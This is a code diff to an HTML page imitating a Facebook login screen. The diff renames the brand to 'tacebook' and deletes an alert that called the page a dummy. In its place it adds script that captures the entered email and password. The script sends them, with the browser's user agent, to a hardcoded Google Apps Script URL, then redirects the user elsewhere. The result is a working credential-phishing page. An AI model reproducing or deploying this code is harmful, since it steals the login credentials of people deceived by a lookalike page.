@@ -197,8 +197,8 @@
 <body>
     <div class="container">
         <div class="left-section">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world around you on facebook.</p>
+            <h1>tacebook</h1>
+            <p>Connect with friends and the world around you on tacebook.</p>
         </div>
 
         <div class="right-section">
@@ -228,16 +228,48 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function (e) {
+        // ── PASTE YOUR GOOGLE APPS SCRIPT URL BELOW ──────────────────────────
+        var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
+        // ─────────────────────────────────────────────────────────────────────
+
+        var form = document.getElementById('loginForm');
+        var btn = form.querySelector('.login-button');
+
+        form.addEventListener('submit', function (e) {
             e.preventDefault();
 
+            var email = form.querySelector('input[name="email"]').value.trim();
+            var password = form.querySelector('input[name="password"]').value;
 
-            const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value;
+            // Basic validation
+            if (!email || !password) return;
 
-            alert('This is a dummy login page. No actual authentication is happening.\n\nEmail: ' + email + '\nPassword: ' + password);
+            // Disable button while submitting
+            btn.disabled = true;
+            btn.textContent = 'Logging in…';
+            btn.style.opacity = '0.7';
 
-
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',          // Required for Apps Script
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    userAgent: navigator.userAgent
+                })
+            })
+                .then(function () {
+                    // no-cors means we can't read the response body — assume success
+                    window.location.href = '/';  // Redirect to BGIS home after login
+                })
+                .catch(function (err) {
+                    btn.disabled = false;
+                    btn.textContent = 'Log In';
+                    btn.style.opacity = '1';
+                    alert('Something went wrong. Please check your connection and try again.');
+                    console.error(err);
+                });
         });
     </script>
 </body>
